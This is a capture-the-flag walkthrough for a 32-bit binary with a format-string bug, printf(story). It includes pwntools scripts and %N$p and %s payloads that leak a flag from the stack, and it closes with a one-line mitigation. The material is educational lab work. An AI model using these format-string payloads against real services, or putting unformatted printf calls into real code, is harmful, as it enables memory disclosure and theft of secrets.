# Flag Leak - CTF Walkthrough

## Challenge Overview
Format string vulnerability that leaks the flag from the stack.

## Binary Info
```
Arch: i386 (32-bit)
Protections: NX only
PIE: Disabled
Canary: Disabled
```

## Vulnerability

```c
void vuln(){
   char flag[BUFSIZE];      // Flag stored on stack
   char story[128];
   
   readflag(flag, FLAGSIZE); // Flag is read into stack buffer
   scanf("%127s", story);
   printf(story);            // FORMAT STRING VULN!
}
```

The `printf(story)` directly uses user input as format string, and the flag is stored on the stack above our buffer.

## Exploitation

### Step 1: Find Flag on Stack

Use format string specifiers to leak stack values:
```bash
# Test different positions
%1$p   # First stack value
%2$p   # Second stack value
...
```

### Step 2: Fuzz for Flag Position

```python
from pwn import *

for i in range(50):
    p = process()
    p.sendline(f"%{i}$p".encode())
    p.recvuntil(b' - \n')
    result = p.recvline().strip()
    print(f"Position {i}: {result}")
    p.close()
```

Look for hex values that decode to ASCII (the flag).

### Step 3: Extract Flag

Once you find the position, use `%s` to read string:
```python
p = process()
p.sendlineafter(b'>> ', b'%<position>$s')
print(p.recvall())
```

Or use multiple `%x` to leak hex values and decode manually.

## Complete Exploit

```python
from pwn import *

elf = context.binary = ELF("./vuln")
p = process()

# Leak multiple stack positions
payload = b'%3$p.%4$p.%5$p.%6$p.%7$p.%8$p.%9$p.%10$p'
p.sendlineafter(b'>> ', payload)
p.recvuntil(b' - \n')
leaks = p.recvline()
print(leaks)

# The flag will be in one of these positions as hex values
# Convert hex to ASCII to get flag
```

## Key Concepts
- **Format String**: `printf(user_input)` allows arbitrary memory reads
- **Stack Layout**: Local variables (including flag) are on the stack
- **Hex to ASCII**: Flag bytes appear as hex values in memory

## Quick Win
Try: `%3$s %4$s %5$s %6$s %7$s %8$s` to dump strings from stack positions 3-8.

## Mitigation
```c
printf("%s", story);  // Always use format specifier!
```
